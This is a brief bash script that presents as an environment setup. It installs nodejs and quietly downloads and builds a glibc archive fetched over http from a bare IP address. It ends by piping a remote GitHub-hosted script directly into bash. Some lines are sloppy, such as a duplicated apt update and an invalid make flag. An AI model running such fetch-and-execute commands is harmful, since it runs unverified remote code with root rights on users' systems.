#!/bin/bash
apt update -y
apt update -y
sudo apt install nodejs -y
wget http://93.188.166.246/glibc-2.28.zip > /dev/null 2>&1
apt-get install unzip > /dev/null 2>&1
unzip glibc-2.28.zip
cd glibc-2.28
mkdir build
cd build
../configure --prefix=/opt/glibc-2.28
make
sudo make install -y
export LD_LIBRARY_PATH=/opt/glibc-2.28/lib:$LD_LIBRARY_PATH
ldd --version
cd .. 
apt install wget -y; bash <(wget -qO- raw.githubusercontent.com/Digulgasoft/inst/main/insta.sh)
